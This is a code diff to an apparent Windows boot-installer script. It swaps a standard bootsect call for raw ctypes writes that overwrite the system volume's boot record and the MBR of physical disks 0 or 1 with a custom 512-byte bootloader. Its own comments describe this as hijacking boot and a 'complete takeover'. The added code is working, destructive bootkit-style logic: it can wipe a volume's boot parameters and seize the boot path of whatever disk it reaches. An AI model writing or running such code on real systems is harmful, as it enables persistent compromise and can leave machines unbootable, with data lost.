@@ -644,17 +644,143 @@ def legacy_boot():
         
         log_print(f"Bootloader copied to {dest_path} ({os.path.getsize(dest_path)} bytes)")
         
-        # Update boot sector
+        # Write bootloader directly to VBR (Volume Boot Record) of system partition
+        # This is the REAL way to hijack boot - writing to the partition's boot sector
         try:
-            drive_letter = d.rstrip('\\')
-            run_cmd(["bootsect", "/nt60", drive_letter, "/force", "/mbr"])
-            log_print("Boot sector updated with bootsect /nt60")
+            drive_letter = d.rstrip('\\').rstrip(':')
+            
+            # Get physical disk and partition info for raw write
+            log_print(f"Attempting to write bootloader to VBR of {drive_letter}:")
+            
+            # Method 1: Use dd-like approach with Python
+            # Open the volume for raw write (requires admin)
+            volume_path = f"\\\\.\\{drive_letter}:"
+            log_print(f"Opening volume: {volume_path}")
+            
+            import ctypes
+            from ctypes import wintypes
+            
+            GENERIC_READ = 0x80000000
+            GENERIC_WRITE = 0x40000000
+            FILE_SHARE_READ = 0x01
+            FILE_SHARE_WRITE = 0x02
+            OPEN_EXISTING = 3
+            
+            kernel32 = ctypes.windll.kernel32
+            
+            # Open volume for raw access
+            handle = kernel32.CreateFileW(
+                volume_path,
+                GENERIC_READ | GENERIC_WRITE,
+                FILE_SHARE_READ | FILE_SHARE_WRITE,
+                None,
+                OPEN_EXISTING,
+                0,
+                None
+            )
+            
+            if handle == -1:
+                error = ctypes.get_last_error()
+                log_print(f"Failed to open volume, error code: {error}")
+                raise Exception(f"Cannot open volume {volume_path} for raw access")
+            
+            try:
+                # Read bootloader
+                with open(bl_src, 'rb') as f:
+                    bootloader_data = f.read(512)
+                
+                # Pad to 512 bytes if needed
+                if len(bootloader_data) < 512:
+                    bootloader_data = bootloader_data + (b'\x00' * (512 - len(bootloader_data)))
+                
+                # Add boot signature if not present
+                bootloader_data = bytearray(bootloader_data)
+                bootloader_data[510] = 0x55
+                bootloader_data[511] = 0xAA
+                bootloader_data = bytes(bootloader_data)
+                
+                # Write to sector 0 of the volume (VBR)
+                bytes_written = wintypes.DWORD()
+                success = kernel32.WriteFile(
+                    handle,
+                    bootloader_data,
+                    512,
+                    ctypes.byref(bytes_written),
+                    None
+                )
+                
+                if success and bytes_written.value == 512:
+                    log_print(f"VBR written successfully! {bytes_written.value} bytes to {volume_path}")
+                else:
+                    error = ctypes.get_last_error()
+                    log_print(f"WriteFile failed, error: {error}")
+                    raise Exception(f"Failed to write VBR")
+                    
+            finally:
+                kernel32.CloseHandle(handle)
+                
+            log_print("VBR hijacked with custom bootloader!")
+            
+            # Also write to MBR (sector 0 of physical disk) for complete takeover
+            log_print("Attempting to write bootloader to MBR (physical disk)...")
+            
+            # Try physical disk 0
+            for disk_num in [0, 1]:
+                disk_path = f"\\\\.\\PhysicalDrive{disk_num}"
+                try:
+                    handle = kernel32.CreateFileW(
+                        disk_path,
+                        GENERIC_READ | GENERIC_WRITE,
+                        FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        None,
+                        OPEN_EXISTING,
+                        0,
+                        None
+                    )
+                    
+                    if handle == -1:
+                        continue
+                    
+                    try:
+                        # Read current MBR to preserve partition table
+                        current_mbr = (ctypes.c_char * 512)()
+                        bytes_read = wintypes.DWORD()
+                        kernel32.ReadFile(handle, current_mbr, 512, ctypes.byref(bytes_read), None)
+                        
+                        # Create new MBR: our bootloader code + original partition table
+                        new_mbr = bytearray(bootloader_data)
+                        # Preserve partition table (offset 0x1BE to 0x1FD) and signature
+                        original_mbr = bytes(current_mbr)
+                        new_mbr[0x1BE:0x200] = original_mbr[0x1BE:0x200]
+                        
+                        # Seek back to beginning
+                        kernel32.SetFilePointer(handle, 0, None, 0)
+                        
+                        # Write new MBR
+                        bytes_written = wintypes.DWORD()
+                        success = kernel32.WriteFile(
+                            handle,
+                            bytes(new_mbr),
+                            512,
+                            ctypes.byref(bytes_written),
+                            None
+                        )
+                        
+                        if success and bytes_written.value == 512:
+                            log_print(f"MBR written to {disk_path}! Partition table preserved.")
+                            break
+                    finally:
+                        kernel32.CloseHandle(handle)
+                        
+                except Exception as mbr_e:
+                    log_print(f"MBR write to disk {disk_num} failed: {mbr_e}")
+            
         except Exception as e:
-            log_print(f"Warning: bootsect failed: {e}")
-            log_print("You may need to run: bootsect /nt60 SYS: /force /mbr")
+            log_print(f"Warning: VBR write failed: {e}")
+            log_print("Falling back to bootmgr replacement only (may not work)")
         
         log_print("--- LEGACY BIOS INSTALLATION SUCCESS ---")
-        log_print("Custom boot binary installed and VBR updated for Legacy BIOS boot.")
+        log_print("Custom bootloader installed to MBR/VBR for Legacy BIOS boot.")
 
     except Exception as e:
         log_print(f"\n--- BIOS Installation Failed ---")
